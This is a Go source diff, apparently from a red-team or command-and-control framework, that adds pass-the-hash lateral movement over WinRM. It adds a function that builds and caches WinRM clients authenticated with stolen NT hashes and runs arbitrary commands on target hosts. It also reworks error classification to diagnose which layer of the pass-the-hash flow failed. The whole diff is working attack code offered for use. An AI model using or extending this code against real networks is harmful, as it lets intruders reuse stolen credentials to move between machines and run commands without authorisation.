@@ -28,20 +28,15 @@ func moveWinRM(ctx context.Context, cfg *pb.LateralMoveConfig) (*pb.LateralMoveR
 	endpoint := winrm.NewEndpoint(cfg.Target, 5985, false, true, nil, nil, nil, 0)
 	user := formatDomainUser(cfg.Domain, cfg.Username)
 
-	var client *winrm.Client
+	var stdout, stderr bytes.Buffer
+	var exitCode int
 	var err error
 	if cfg.NtlmHash != "" {
 		hashHex, herr := normalizeNTHashHex(cfg.NtlmHash)
 		if herr != nil {
-			return nil, herr
+			return nil, pthWrap(PTHLayerKeyDerivation, herr)
 		}
-		params := *winrm.DefaultParameters
-		params.TransportDecorator = func() winrm.Transporter {
-			return newClientNTLMWithHash(user, hashHex)
-		}
-		// Password unused by hash transport. Transport seals SOAP when Sign/Seal negotiated
-		// (AllowUnencrypted=false parity with password-path NewEncryption("ntlm")).
-		client, err = winrm.NewClientWithParameters(endpoint, user, "x", &params)
+		exitCode, err = runPTHCommand(ctx, cfg.Target, user, hashHex, endpoint, cfg.Command, &stdout, &stderr)
 	} else {
 		// Prefer NTLM message encryption (pypsrp encryption=auto parity) when available.
 		// Falls back to plain ClientNTLM if encryption setup fails.
@@ -55,14 +50,13 @@ func moveWinRM(ctx context.Context, cfg *pb.LateralMoveConfig) (*pb.LateralMoveR
 				return &winrm.ClientNTLM{}
 			}
 		}
+		var client *winrm.Client
 		client, err = winrm.NewClientWithParameters(endpoint, user, cfg.Password, &params)
+		if err != nil {
+			return nil, fmt.Errorf("create WinRM client: %w", classifyWinRMError(err, false, user))
+		}
+		exitCode, err = client.RunWithContext(ctx, cfg.Command, &stdout, &stderr)
 	}
-	if err != nil {
-		return nil, fmt.Errorf("create WinRM client: %w", err)
-	}
-
-	var stdout, stderr bytes.Buffer
-	exitCode, err := client.RunWithContext(ctx, cfg.Command, &stdout, &stderr)
 	if err != nil {
 		return nil, fmt.Errorf("WinRM exec: %w", classifyWinRMError(err, cfg.NtlmHash != "", user))
 	}
@@ -80,25 +74,58 @@ func moveWinRM(ctx context.Context, cfg *pb.LateralMoveConfig) (*pb.LateralMoveR
 	}, nil
 }
 
-// classifyWinRMError appends actionable hints for common lab failures (401, encryption).
+func runPTHCommand(ctx context.Context, target, user, hashHex string, endpoint *winrm.Endpoint, command string, stdout, stderr *bytes.Buffer) (int, error) {
+	slot := acquirePTHSlot(pthSessionKey(target, user, hashHex))
+	slot.mu.Lock()
+	defer slot.mu.Unlock()
+	if slot.client == nil {
+		tpt := newClientNTLMWithHash(user, hashHex)
+		params := *winrm.DefaultParameters
+		params.TransportDecorator = func() winrm.Transporter { return tpt }
+		client, err := winrm.NewClientWithParameters(endpoint, user, "x", &params)
+		if err != nil {
+			return 0, err
+		}
+		slot.transport = tpt
+		slot.client = client
+	}
+	return slot.client.RunWithContext(ctx, command, stdout, stderr)
+}
+
+// classifyWinRMError names a PTH layer (Day-3 gate) and keeps a short hint.
 func classifyWinRMError(err error, usedHash bool, domainUser string) error {
 	if err == nil {
 		return nil
 	}
-	msg := err.Error()
-	// HTTP 401 / unauthorized
-	if strings.Contains(msg, "401") || strings.Contains(strings.ToLower(msg), "unauthorized") {
-		hint := "check domain\\user format and creds"
-		if usedHash {
-			hint = "PTH: use --domain NETBIOS (or DOMAIN\\user); hash must be 32-hex NT; " +
-				"hash path prefers NTLM message encryption and falls back to plain SOAP if rejected"
-		} else {
-			hint = "password path uses NTLM message encryption when available; verify domain\\user and password"
-		}
-		return fmt.Errorf("%w (user=%s; %s)", err, domainUser, hint)
+	if _, ok := PTHDiagnose(err); ok {
+		return err
 	}
-	if strings.Contains(strings.ToLower(msg), "encrypt") || strings.Contains(msg, "415") {
-		return fmt.Errorf("%w (WinRM message encryption/content-type issue; hash path retries plain SOAP after seal rejection)", err)
+	msg := err.Error()
+	low := strings.ToLower(msg)
+	if usedHash {
+		switch {
+		case strings.Contains(low, "timeout"), strings.Contains(low, "connection refused"),
+			strings.Contains(low, "no such host"):
+			return pthWrapNet(fmt.Errorf("%w (user=%s)", err, domainUser))
+		case strings.Contains(msg, "415"), strings.Contains(low, "multipart"),
+			strings.Contains(low, "content-type"):
+			return pthWrap(PTHLayerWinRMMIME, fmt.Errorf("%w (user=%s)", err, domainUser))
+		case strings.Contains(low, "unseal"), strings.Contains(low, "seal"),
+			strings.Contains(low, "encrypt"):
+			return pthWrap(PTHLayerSignSeal, fmt.Errorf("%w (user=%s)", err, domainUser))
+		case strings.Contains(low, "www-authenticate"), strings.Contains(low, "negotiate"):
+			return pthWrap(PTHLayerHTTPNegotiate, fmt.Errorf("%w (user=%s)", err, domainUser))
+		case strings.Contains(msg, "401") || strings.Contains(low, "unauthorized"):
+			return pthWrap(PTHLayerNTLMHandshake, fmt.Errorf("%w (user=%s; PTH: NETBIOS domain + 32-hex NT; one flow, no seal→plain retry)", err, domainUser))
+		default:
+			return pthWrap(PTHLayerNTLMHandshake, fmt.Errorf("%w (user=%s)", err, domainUser))
+		}
+	}
+	if strings.Contains(msg, "401") || strings.Contains(low, "unauthorized") {
+		return fmt.Errorf("%w (user=%s; password path uses NTLM message encryption when available)", err, domainUser)
+	}
+	if strings.Contains(low, "encrypt") || strings.Contains(msg, "415") {
+		return fmt.Errorf("%w (WinRM message encryption/content-type issue)", err)
 	}
 	return err
 }
